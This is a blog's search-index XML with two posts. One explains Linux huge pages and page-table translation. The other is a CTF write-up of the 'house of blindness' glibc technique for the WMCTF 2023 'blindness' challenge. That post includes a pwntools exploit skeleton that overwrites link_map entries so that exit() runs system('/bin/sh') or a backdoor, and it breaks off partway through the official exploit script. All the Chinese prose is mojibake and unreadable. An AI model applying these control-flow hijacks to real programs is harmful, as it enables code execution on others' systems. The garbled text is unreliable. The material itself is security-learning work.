<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ã€Kernelã€‘Linux Huge Pages</title>
    <link href="/2023/09/11/%E3%80%90Kernel%E3%80%91Linux%20Huge%20Pages/"/>
    <url>/2023/09/11/%E3%80%90Kernel%E3%80%91Linux%20Huge%20Pages/</url>
    
    <content type="html"><![CDATA[<blockquote><p>åœ¨HITCON CTF 2023çš„ä¸€é“QEMU escapeé¢˜ç›®ä¸­ï¼Œåˆ©ç”¨åˆ°äº†Huge Pagesè¿™é¡¹æŠ€æœ¯ï¼Œå€Ÿæ­¤å¤ç°é¢˜ç›®çš„æœºä¼šï¼Œæ¥å­¦ä¹ äº†è§£ä¸‹è¿™éƒ¨åˆ†çŸ¥è¯†ã€‚</p></blockquote><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>å½“è¿›ç¨‹ä½¿ç”¨ RAM æ—¶ï¼ŒCPU ä¼šå°†å…¶æ ‡è®°ä¸ºå·²è¢«è¯¥è¿›ç¨‹ä½¿ç”¨ã€‚ä¸ºäº†æé«˜æ•ˆç‡ï¼ŒCPU ä»¥å—çš„å½¢å¼åˆ†é… RAMâ€”â€”4K å­—èŠ‚æ˜¯è®¸å¤šå¹³å°ä¸Šçš„é»˜è®¤å€¼ã€‚è¿™äº›å—è¢«ç§°ä¸ºé¡µé¢ã€‚é¡µé¢å¯ä»¥äº¤æ¢åˆ°ç£ç›˜ç­‰ã€‚</p><p>ç”±äºè¿›ç¨‹åœ°å€ç©ºé—´æ˜¯è™šæ‹Ÿçš„ï¼ŒCPUå’Œæ“ä½œç³»ç»Ÿéœ€è¦è®°ä½å“ªäº›é¡µå±äºå“ªä¸ªè¿›ç¨‹ï¼Œä»¥åŠæ¯ä¸ªé¡µå­˜å‚¨åœ¨å“ªé‡Œã€‚é¡µé¢è¶Šå¤šï¼ŒæŸ¥æ‰¾å†…å­˜æ˜ å°„ä½ç½®æ‰€éœ€çš„æ—¶é—´å°±è¶Šå¤šã€‚å› è€Œå¤§å¤šæ•°å½“å‰çš„ CPU æ¶æ„éƒ½æ”¯æŒ<strong>larger-than-default pages</strong>ï¼Œè¿™ä½¿å¾— CPU&#x2F;OS éœ€è¦æŸ¥æ‰¾çš„æ¡ç›®æ›´å°‘ã€‚ä¸åŒçš„æ“ä½œç³»ç»Ÿå¯¹å®ƒæœ‰ä¸åŒå‘½åæ–¹å¼ï¼Œåœ¨Linuxä¸Šå³ä¸º<strong>Huge Pages</strong>.</p><h2 id="å†…å­˜æ˜ å°„"><a href="#å†…å­˜æ˜ å°„" class="headerlink" title="å†…å­˜æ˜ å°„"></a>å†…å­˜æ˜ å°„</h2><p>é¦–å…ˆå›é¡¾ä¸‹Linuxä¸­çš„å†…å­˜æ˜ å°„ï¼Œä¸‹å›¾å±•ç¤ºäº†64ä½Linuxç³»ç»Ÿä¸­ï¼Œè™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜çš„è½¬æ¢æ–¹å¼ï¼Œä¹Ÿä½“ç°äº†Linuxçš„4çº§é¡µè¡¨ç»“æ„</p><blockquote><p>å·çš„å›¾ï¼Œä¾µåˆ ğŸ˜­</p></blockquote><p><img src="/img/article/hugepages/v2-5ed1c1d62faa246410a4df932d533130_1440w.webp" alt="img"></p><p>æœ‰å›¾å¯çŸ¥ï¼ŒLinuxåªä½¿ç”¨äº†64ä½åœ°å€çš„å‰48ä½ï¼Œå¹¶å°†å…¶è™šæ‹Ÿåœ°å€åˆ†ä¸º5ä¸ªéƒ¨åˆ†ï¼š</p><ul><li><code>PGDç´¢å¼•</code>ï¼Œä¸ºè™šæ‹Ÿåœ°å€çš„39-47ä½(9bit)ï¼Œä»£è¡¨å…¶åœ¨<code>Page Global Directory</code>ä¸Šçš„ç´¢å¼•</li><li><code>PUDç´¢å¼•</code>ï¼Œä¸ºè™šæ‹Ÿåœ°å€çš„30-38ä½(9bit)ï¼Œä»£è¡¨å…¶åœ¨<code>Page Upper Directory</code>ä¸Šçš„ç´¢å¼•</li><li><code>PMDç´¢å¼•</code>ï¼Œä¸ºè™šæ‹Ÿåœ°å€çš„21-29ä½(9bit)ï¼Œä»£è¡¨å…¶åœ¨<code>Page Middle Diectory</code>ä¸Šçš„ç´¢å¼•</li><li><code>PTEç´¢å¼•</code>ï¼Œä¸ºè™šæ‹Ÿåœ°å€çš„12-20ä½(9bit)ï¼Œä»£è¡¨å…¶åœ¨<code>Page Table</code>ä¸Šçš„ç´¢å¼•</li><li><code>åç§»é‡</code>ï¼Œä¸ºè™šæ‹Ÿåœ°å€çš„0-11ä½(12bit)ï¼Œä»£è¡¨å…¶åœ¨å¯¹åº”<code>Physical Page</code>ä¸Šçš„åç§»</li></ul><p>æ­¤å¤–ï¼ŒCPUæœ‰å‡ ä¸ªæ§åˆ¶å¯„å­˜å™¨ï¼Œå¦‚ä¸‹å›¾CR0-CR4ï¼Œå„è‡ªæœ‰ä¸åŒçš„ä½œç”¨ã€‚å…¶ä¸­<code>CR3</code>çš„å¯„å­˜å™¨ä¸»è¦ç”¨äºå­˜æ”¾<code>Page Global Directory</code>çš„ç‰©ç†åœ°å€ã€‚è¯¦ç»†çš„çš„è®²è§£å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« :<a href="https://fishc.com.cn/blog-9-824.html">æ§åˆ¶å¯„å­˜å™¨ (CR0 , CR1 , CR2 , CR3)</a></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2lsaW51eGtlcm5lbC5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTEvMDYvMDYyMTExXzE0MzRfeDg2eDg2NjRDUFUxLnBuZw?x-oss-process=image/format,png" alt="img"></p><p>åŸºäºä¸Šè¿°çš„çŸ¥è¯†æˆ‘ä»¬å¯ä»¥åˆ†æä¸‹ï¼Œè™šæ‹Ÿåœ°å€è½¬æ¢ç‰©ç†åœ°å€æµç¨‹ã€‚</p><ol><li>ä»CR3å¯„å­˜å™¨ä¸­å–å¾—<code>Page Global Directory</code>çš„ç‰©ç†åœ°å€</li><li>åˆ©ç”¨è™šæ‹Ÿåœ°å€ä¸­çš„<code>PGDç´¢å¼•</code>éƒ¨åˆ†ï¼Œåœ¨<code>Page Global Directory</code>ä¸­å–å‡º<code>Page Upper Directory</code>çš„ç‰©ç†åœ°å€</li><li>åˆ©ç”¨è™šæ‹Ÿåœ°å€ä¸­çš„<code>PUDç´¢å¼•</code>éƒ¨åˆ†ï¼Œåœ¨<code>Page Upper Directory</code>ä¸­å–å‡º<code>Page Middle Diectory</code>çš„ç‰©ç†åœ°å€</li><li>åˆ©ç”¨è™šæ‹Ÿåœ°å€ä¸­çš„<code>PMDç´¢å¼•</code>éƒ¨åˆ†ï¼Œåœ¨<code>Page Middle Diectory</code>ä¸­å–å‡º<code>Page Table</code>çš„ç‰©ç†åœ°å€</li><li>åˆ©ç”¨è™šæ‹Ÿåœ°å€ç»ˆç«¯<code>PTEç´¢å¼•</code>éƒ¨åˆ†ï¼Œåœ¨<code>Page Table</code>ä¸­å–å‡ºå¯¹åº”ç‰©ç†å†…å­˜é¡µåœ°å€</li><li>æ­¤æ—¶è™šæ‹Ÿåœ°å€æ‰€å¯¹åº”çš„ç‰©ç†åœ°å€å°±å¯ä»¥å¾—åˆ°äº†ï¼Œè®¡ç®—å…¬å¼ï¼š<strong>ç‰©ç†åœ°å€ &#x3D; è™šæ‹Ÿåœ°å€ä½12ä½offset + ç‰©ç†å†…å­˜é¡µåœ°å€</strong></li></ol><h2 id="Huge-PagesåŸç†"><a href="#Huge-PagesåŸç†" class="headerlink" title="Huge PagesåŸç†"></a>Huge PagesåŸç†</h2><p>åœ¨æ˜ç™½äº†ä¸Šè¿°å†…å­˜åœ°å€çš„åˆ’åˆ†åï¼ŒHuge Pageçš„åŸç†å°±æ¯”è¾ƒå¥½ç†è§£äº†ï¼Œå³æ‰©å¤§ç‰©ç†é¡µå¤§å°ï¼Œå‡å°‘é¡µè¡¨å±‚çº§ã€‚åœ¨Linuxä¸­ï¼Œä¸»è¦çš„<code>HugePage</code>çš„å¤§å°ä¸º2MB(å³12bit + 9bit)å’Œ1GB(å³12bit + 9bit +bit)ï¼Œä¸‹é¢ä»¥2MBçš„<code>HugePage</code>ä¸¾ä¾‹</p><p><img src="/img/article/hugepages/v2-e2cadc8bb0e4705001f4262547fb6ded_r.jpg" alt="img"></p><p>å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ç”±äºé¡µå¤§å°æ‰©å¤§è‡³2MBï¼Œå…¶è™šæ‹Ÿåœ°å€ä¸­ï¼Œè¡¨ç¤ºåç§»çš„éƒ¨åˆ†æ‰©å¤§åˆ°äº†(12+9)bitã€‚åŸå…ˆçš„4çº§é¡µè¡¨ä¹Ÿå˜ä¸º3çº§é¡µè¡¨ï¼ŒåŒç†ï¼Œ1Gå¤§å°çš„é¡µå¯¹åº”2çº§é¡µè¡¨ã€‚æ‰€ä»¥æ­¤æ—¶ <code>Page Middle Directory</code> ç›´æ¥æŒ‡å‘æ˜ å°„çš„ç‰©ç†å†…å­˜é¡µåœ°å€ã€‚</p><blockquote><p>è¿™æ ·æˆ‘ä»¬ä¹Ÿèƒ½å¤Ÿç†è§£ï¼Œä¸ºä»€ä¹ˆHugePageä¸€èˆ¬ä¸º2MBå’Œ1GBè¿™æ ·å›ºå®šçš„å¤§å°ã€‚ä»å¦ä¸€ä¸ªè§’åº¦ç†è§£ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½çœ‹åˆ°è¿™ç§åœ°å€åˆ’åˆ†æ–¹å¼ä¸IPåœ°å€ä¸­Aç±»ï¼ŒBç±»ï¼ŒCç±»åœ°å€çš„åˆ’åˆ†æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ã€‚</p></blockquote><h2 id="å¦‚ä½•è®¾ç½®-HugePages"><a href="#å¦‚ä½•è®¾ç½®-HugePages" class="headerlink" title="å¦‚ä½•è®¾ç½® HugePages"></a>å¦‚ä½•è®¾ç½® HugePages</h2><p>åœ¨<code>root</code>æƒé™ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼Œè®¾ç½®HugePagesçš„æ•°é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl vm.nr_hugepages=32 <span class="hljs-comment">#å…¶ä¸­32ä»£è¡¨ä¸ªæ•°</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹æ˜¯å¦è®¾ç½®æˆåŠŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/meminfo | grep -i huge<br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚å›¾ï¼Œèƒ½å¤Ÿæ˜¾ç¤ºå‡ºæ€»å…±çš„Hugepagesçš„æ•°é‡ï¼Œä»¥åŠå¤„äºfreeçŠ¶æ€çš„HugePagesçš„æ•°é‡</p><p><img src="/img/article/hugepages/image-20230911143756972.png" alt="image-20230911143756972"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€trickã€‘house of blindness</title>
    <link href="/2023/09/07/%E3%80%90trick%E3%80%91house%20of%20blindness/"/>
    <url>/2023/09/07/%E3%80%90trick%E3%80%91house%20of%20blindness/</url>
    
    <content type="html"><![CDATA[<blockquote><p>åœ¨WMCTF 2023å®˜æ–¹wpä¸­ï¼Œçœ‹åˆ°äº†ä¸€ä¸ªååˆ†æ–°å¥‡çš„æ‰‹æ³•house of blindness. å…¶æ— éœ€leakåœ°å€å´ä»ç„¶èƒ½å¤Ÿhijackç¨‹åºæµï¼Œè¿™é‡Œåšä»¥å­¦ä¹ ç ”ç©¶ã€‚æœ¬æ–‡ä¾‹é¢˜ä½¿ç”¨WMCTF2023 blindness</p><p>å‚è€ƒæ–‡ç« : <a href="https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA">issues in exit town - HackMD</a></p></blockquote><h2 id="å‰ç½®"><a href="#å‰ç½®" class="headerlink" title="å‰ç½®"></a>å‰ç½®</h2><p>é¦–å…ˆè¡¥å……ä¸€ä¸ªå…³äºmallocçš„å‰ç½®çŸ¥è¯†</p><ul><li>å¦‚æœç”³è¯·çš„chunkå¤§å°éå¸¸å¤§ï¼Œé‚£ä¹ˆä¾¿ä¸ä¼šä½¿ç”¨ptmallocæ¥è¿›è¡Œchunkçš„åˆ†é…ï¼Œè€Œæ˜¯è°ƒç”¨<code>mmap()</code></li><li>å¦å¤–ï¼Œè¿™æ ·ç”³è¯·å‡ºæ¥çš„chunkä½ç½®ä¸libcå’Œldçš„åç§»ä¿æŒä¸€è‡´</li></ul><p>å¦‚å›¾ï¼Œæˆ‘ä»¬ç”³è¯·å‡ºæ¥çš„chunkä½ç½®å¦‚ä¸‹</p><p><img src="/img/article/blindness/image-20230907163127358.png" alt="image-20230907163127358"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå…¶åœ°å€ä¸libcå’Œldè¿åœ¨ä¸€èµ·</p><h2 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h2><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦å…³æ³¨ä¸€ä¸‹.dynamicèŠ‚</p><p>åœ¨gdbä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>dyn</code>å‘½ä»¤æŸ¥çœ‹.dynamicèŠ‚å†…å®¹ã€‚å…¶ä¸­çš„å†…å®¹æ°›å›´ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸ªæ˜¯tagç”¨äºè¡¨ç¤ºåç§°ï¼Œä¸€ä¸ªæ˜¯value.</p><p><img src="/img/article/blindness/image-20230907142037610.png" alt="image-20230907142037610"></p><p>è¿™ä¸ªç»“æ„ç”±äºæ˜¯é™æ€çš„ï¼Œæ‰€ä»¥åŒæ ·å¯ä»¥åœ¨IDAä¸­çœ‹åˆ°</p><p><img src="/img/article/blindness/image-20230907142646702.png" alt="image-20230907142646702"></p><p>å…¶ä¸­æˆ‘ä»¬éœ€è¦å…³æ³¨ä¸‹<code>DT_FINI</code>è¿™ä¸ªtagï¼Œä¹Ÿå°±æ˜¯gdbä¸­æ˜¾ç¤ºçš„<code>FINI</code>ï¼Œå…¶ä»£è¡¨äº†<code>fini</code>å‡½æ•°åˆ°ç¨‹åºåŠ è½½çš„è™šæ‹Ÿåœ°å€çš„offsetï¼Œå³<code>real_fini_addr = code_base + DT_FINI</code>ï¼Œä»¥æœ¬é¢˜ä¸ºä¾‹æˆ‘ä»¬å¯ä»¥å¾—åˆ°</p><p><img src="/img/article/blindness/image-20230907143044385.png" alt="image-20230907143044385"></p><p>åœ¨<code>exit()</code>å‡½æ•°çš„æºç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚ä¸‹éƒ¨åˆ†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Is there a destructor function?  */</span><br><span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span><br>    || l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>  &#123;<br>    <span class="hljs-comment">/* When debugging print a message first.  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)<br>                          &amp; DL_DEBUG_IMPCALLS, <span class="hljs-number">0</span>))<br>      _dl_debug_printf (<span class="hljs-string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,<br>                        DSO_FILENAME (l-&gt;l_name),<br>                        ns);<br>    <span class="hljs-comment">/* First see whether an array is given.  */</span><br>    <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="hljs-literal">NULL</span>)<br>      &#123;<br>        ElfW(Addr) *<span class="hljs-built_in">array</span> =<br>          (ElfW(Addr) *) (l-&gt;l_addr<br>                          + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val<br>                          / <span class="hljs-keyword">sizeof</span> (ElfW(Addr)));<br>        <span class="hljs-keyword">while</span> (i-- &gt; <span class="hljs-number">0</span>)<br>          ((<span class="hljs-type">fini_t</span>) <span class="hljs-built_in">array</span>[i]) ();<br>      &#125;<br>    <span class="hljs-comment">/* Next try the old-style destructor.  */</span><br>    <span class="hljs-keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="hljs-literal">NULL</span>)<br>      DL_CALL_DT_FINI<br>        (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);<br>  &#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æœ€ä¸‹æ–¹çš„<code>DL_CALL_DT_FINI(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</code>ä¾¿æ˜¯è°ƒç”¨<code>_fini</code>å‡½æ•°çš„éƒ¨åˆ†ï¼Œå®å®šä¹‰å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">define</span> DL_CALL_DT_FINI(map, start) ((fini_t) (start)) ()</span><br></code></pre></td></tr></table></figure><p>è€Œ<code>l_addr</code>å’Œ<code>l_info[DT_FINI]</code>æ­£å¯¹åº”è¿™æˆ‘ä»¬å‰é¢è°ˆåˆ°çš„codebaseå’Œ.dynamicèŠ‚ä¸Šçš„åç§»ï¼Œlä¸ºåœ¨ldä¸­å­˜æ”¾çš„link_mapç»“æ„</p><p>ä»¥æœ¬é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬ç”¨gdbè·Ÿè¸ªexitæµã€‚å¯ä»¥å‘ç°ï¼Œåœ¨è°ƒç”¨å®Œ<code>__do_global_dtors_aux</code>ä¹‹åï¼Œç¨‹åºæµä¾¿ä¼šé€šè¿‡r15ï¼Œæ¥è°ƒç”¨<code>fini</code>ï¼Œå¦‚å›¾</p><p><img src="/img/article/blindness/image-20230907154901922.png" alt="image-20230907154901922"></p><p><img src="/img/article/blindness/image-20230907154040648.png" alt="image-20230907154040648"></p><p>å…¶ä¸­<code>mov    rax,QWORD PTR [r15+0xa8] </code>ï¼Œå°±æ˜¯å¯¹åº”<code>l_info[DT_FINI]</code>ï¼Œå³æŒ‡å‘.dynmicä¸­DT_FINIæ¡ç›®çš„æŒ‡é’ˆ</p><p><img src="/img/article/blindness/image-20230907154606194.png" alt="image-20230907154606194"></p><p>è€Œ<code>add    rax,QWORD PTR [r15]</code>ï¼Œå¯¹åº”<code>l_addr</code>ï¼Œä¹Ÿå°±æ˜¯codebase</p><h2 id="house-of-blindness"><a href="#house-of-blindness" class="headerlink" title="house of blindness"></a>house of blindness</h2><p>æ˜ç™½äº†è°ƒç”¨<code>fini</code>çš„åŸç†åï¼Œhow do we exploit this?</p><p>å¯ä»¥æƒ³è±¡ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ›´æ”¹<strong>link_map</strong>çš„å†…å®¹ï¼Œæ¯”å¦‚å­˜æ”¾codebaseå’ŒæŒ‡å‘DT_FINIæ¡ç›®çš„æŒ‡é’ˆã€‚é‚£ä¹ˆåœ¨è°ƒç”¨finiæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ä¸¤è€…ä¹‹å’Œä¸º<code>system</code>è¿™æ ·çš„å‡½æ•°ï¼Œä»è€Œæ‹¿åˆ°shellï¼ˆè¿™é‡Œæˆ‘ä»¬å…ˆä¸è€ƒè™‘rdiå‚æ•°å¦‚ä½•æ§åˆ¶ï¼‰ã€‚è¿™ä¹Ÿæ˜¯æ‰€è°“house of blindnessçš„æ ¸å¿ƒæ€æƒ³ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜æ˜¯æ¥çœ‹çœ‹å®Œæ•´çš„æµç¨‹ã€‚</p><p>é¦–å…ˆè€ƒè™‘ï¼Œè‹¥æˆ‘ä»¬æƒ³è®©ä¸¤è€…ä¹‹å’Œä¸ºsystemè¿™æ ·çš„libcå‡½æ•°ï¼Œé‚£ä¹ˆä¸€å®šè¦æ˜¯ä¸€ä¸ªlibcçš„åœ°å€+ä¸€ä¸ªåç§»çš„å½¢å¼ï¼Œå› è€ŒåŸæœ‰çš„codebase+offsetçš„å½¢å¼æ˜¯ä¸æ»¡è¶³è¦æ±‚çš„ã€‚ç”±äºæˆ‘ä»¬æ²¡æœ‰leakçš„èƒ½åŠ›ï¼Œåœ¨ä¸è€ƒè™‘çˆ†ç ´çš„æƒ…å†µä¸‹åªèƒ½è¦†ç›–å†™æœ€ä½å­—èŠ‚ï¼Œæ˜¾ç„¶æ— æ³•è®©ä¸€ä¸ªtextæ®µåœ°å€è°ƒæ•´è‡³libcã€‚</p><p>åŸä½œè€…ç»™å‡ºçš„è§£æ³•æ˜¯åˆ©ç”¨<code>DT_DEBUG</code>æ¡ç›®ã€‚DT_DEBUGä¸­å­˜æ”¾äº†æŒ‡å‘<code>_r_debug</code>å‡½æ•°çš„æŒ‡é’ˆï¼Œä¸”<code>_r_debug</code>æ˜¯ä¸€ä¸ªldéƒ¨åˆ†çš„åœ°å€ï¼Œåˆ™æˆ‘ä»¬åªéœ€è¦éœ€è¦å°†l_addråŠ«æŒä¸º<code>_r_debug</code>å’Œ<code>system</code>å‡½æ•°çš„å·®ï¼Œl_info[DT_FINI]åŠ«æŒä¸ºDT_DEBUGæ¡ç›®ï¼Œå°±å¯ä»¥æ‰§è¡Œsystemã€‚</p><p><img src="/img/article/blindness/image-20230907160909407.png" alt="image-20230907160909407"></p><p>æ­¤æ—¶rdiå‚æ•°æ°å¥½ä¹Ÿæ˜¯ldä¸­çš„ä¸€ä¸ªæŒ‡é’ˆï¼Œå¦å¤–è¿˜éœ€è¦åŠ«æŒ<code>fini_array</code>ä¸ºç©ºï¼Œé˜²æ­¢ç”±äºæŒ‡é’ˆæ›´æ”¹å‡ºç°crash</p><p>åŸä½œè€…ç»™å‡ºäº†expçš„å¤§è‡´å½¢å¼å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># disable fini array from exec</span><br>write(ld.address + link_map + l_info + <span class="hljs-number">8</span> * DT_FINI_ARRAY, p64(<span class="hljs-number">0</span>))<br><br><span class="hljs-comment"># overwrite l_info[DT_FINI]&#x27;s lsb so that it points to _r_debug</span><br>write(ld.address + link_map + l_info + <span class="hljs-number">8</span> * DT_FINI, <span class="hljs-string">b&quot;\xb8&quot;</span>)<br><br><span class="hljs-comment"># overwrite l_addr with offset to bring _r_debug to system</span><br>write(<br>    ld.address + link_map,<br>    p64(libc.symbols[<span class="hljs-string">&quot;system&quot;</span>] - ld.symbols[<span class="hljs-string">&quot;_r_debug&quot;</span>], signed=<span class="hljs-literal">True</span>),<br>)<br><br><span class="hljs-comment"># fill _dl_load_lock with /bin/sh</span><br>write(ld.symbols[<span class="hljs-string">&quot;_rtld_global&quot;</span>] + _dl_load_lock, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>mallocçš„sizeä¸é™åˆ¶å¤§å°ï¼Œæ¯”å¦‚å¯ä»¥<code>malloc(0x100000)</code></li><li>å¯ä»¥åœ¨mallocå‡ºçš„chunké™„è¿‘å®ç°è¶Šç•Œçš„ä»»æ„å†™</li></ul><p>ä½œè€…ç»™å‡ºçš„åˆ©ç”¨æ¡ä»¶çš„å½¢å¼å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// get size from user</span><br><span class="hljs-type">char</span> *chunk = <span class="hljs-built_in">malloc</span>(size);<br><span class="hljs-comment">// get idx and byte from the user</span><br>chunk[idx] = byte;<br></code></pre></td></tr></table></figure><h2 id="WMCTF-blindness"><a href="#WMCTF-blindness" class="headerlink" title="WMCTF blindness"></a>WMCTF blindness</h2><p>WMCTFçš„è¿™é“ä¾‹é¢˜ä¹Ÿä½¿ç”¨äº†ç±»ä¼¼çš„æ€æƒ³ï¼Œä¸è¿‡æ‰‹æ³•å¹¶ä¸å®Œå…¨ç›¸åŒï¼Œå¹¶éåˆ©ç”¨<code>DT_DEBUG</code>. æˆ‘ä»¬å¯ä»¥å†çœ‹ä¸€çœ¼æœ¬é¢˜çš„.dynamicæ ‡ç­¾çš„åœ°å€åˆ†å¸ƒ</p><p><img src="/img/article/blindness/image-20230907142646702.png" alt="image-20230907142646702"></p><p>å¯ä»¥æ³¨æ„åˆ°<code>DT_FINI</code>çš„åœ°å€ä¸º0x3DB8ï¼Œ<code>DT_DEBUG</code>çš„åœ°å€ä¸º0x3E58ï¼Œå³å¦‚æœæˆ‘ä»¬è€ƒè™‘åŸä½œè€…çš„æ€è·¯ã€‚åˆ™éœ€è¦è¦†ç›–2ä¸ªbyteï¼Œå³ä»éœ€1&#x2F;16çš„çˆ†ç ´ã€‚ä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œæœ¬é¢˜æ˜¯å­˜åœ¨åé—¨<code>backdoor</code>çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>l_info[DT_FINI]</code>ä¸ºä¸€ä¸ªtextæ®µçš„å‡½æ•°ï¼Œç„¶ååˆ©ç”¨l_addråç§»è‡³åé—¨å³å¯ã€‚å¯ä»¥çœ‹åˆ°.dynamicä¸Šé¢çš„ä¸€ä¸ªæ ‡ç­¾<code>__frame_dummy_init_array_entry</code></p><p><img src="/img/article/blindness/image-20230907173436438.png" alt="image-20230907173436438"></p><p>ä¸”æ°å¥½åé—¨å‡½æ•°å’Œè¯¥å‡½æ•°åªæœ‰0x9çš„åç§»ï¼Œå¦‚å›¾ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¦†ç›–l_info[DT_FINI]çš„æœ€ä½å­—èŠ‚ä»0xB8åˆ°0x80ï¼Œç„¶åæ§åˆ¶l_addråç§»ä¸º9ï¼Œä»è€Œæ‰§è¡Œåé—¨å‡½æ•°.</p><p><img src="/img/article/blindness/image-20230907173108919.png" alt="image-20230907173108919"></p><p>å®˜æ–¹expå¦‚ä¸‹ï¼Œä¼°è®¡å‡ºé¢˜äººå¥—äº†è‡ªå·±çš„æ¿å­ï¼Œå› è€Œæ³¨é‡Šä¸ä»£ç å¹¶ä¸åŒ¹é…ï¼Œè¿™é‡Œå¹¶éåˆ©ç”¨DT_DEBUGã€‚ä¸”åŠ«æŒå‚æ•°ä¸º<code>/bin/sh</code>ä¹Ÿæ˜¯æ— å¿…è¦çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">addr,content</span>):<br>    content = <span class="hljs-built_in">list</span>(content)<br>    payload = <span 